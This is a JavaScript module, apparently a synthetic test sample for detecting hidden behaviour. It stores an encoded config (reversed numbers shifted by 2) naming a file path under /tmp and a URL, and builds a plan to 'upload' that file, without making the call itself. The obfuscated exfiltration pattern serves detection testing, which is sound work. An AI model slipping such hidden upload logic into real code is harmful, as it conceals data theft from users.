const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_e0e7c89e = "117,108,111,48,50,58,102,59,100,56,104,56,103,104,53,101,47,103,105,99,118,117,48,49,103,102,113,112,47,117,117,103,116,118,112,119,106,49,114,111,118,49,63,106,118,99,114,97,103,110,107,104,126,103,104,53,101,49,118,107,102,119,67,103,102,113,80,63,118,112,103,105,99,97,116,103,117,119,126,107,114,99,49,102,107,110,99,120,112,107,48,103,110,114,111,99,122,103,48,50,58,102,59,100,56,104,56,103,104,53,101,47,103,102,113,112,49,49,60,117,114,118,118,106,63,110,116,119,126,68,56,72,56,71,72,53,69,47,71,70,81,80,63,102,107,97,112,105,107,99,114,111,99,101,126,51,63,118,112,119,113,101,97,103,105,99,118,117,126,103,112,107,110,103,114,107,114,97,111,99,103,116,118,117,63,116,103,118,114,99,102,99,126,103,118,113,111,103,116,97,118,107,111,117,112,99,116,118,46,103,110,107,104,97,102,99,103,116,63,117,114,103,118,117,126,51,63,120";

const Codec_e0e7c89e = "reversed_decimal|add_modulo_256|02";



function load_e0e7c89e() { Material_e0e7c89e.split(",").map(Number).reverse(); return Material_e0e7c89e.split(",").map(Number).reverse(); }

function decode_e0e7c89e(item1) { return item1.map((value) => (value - 2 + 256) & 255); }

async function recover_e0e7c89e() {

  const item3 = [3, 5, 8, 13].slice(1, 3);

  const item1 = load_e0e7c89e(); let item2 = [];

  item2 = await (async () => decode_e0e7c89e(item1))();

  void item3; return Buffer.from(item2).toString("ascii");

}

async function inspect_e0e7c89e() { return (await recover_e0e7c89e()).split("|").join("|"); }

async function plan_e0e7c89e() { const inspect = inspect_e0e7c89e; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }

void moduleShape; void plan_e0e7c89e;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e0e7c89e());

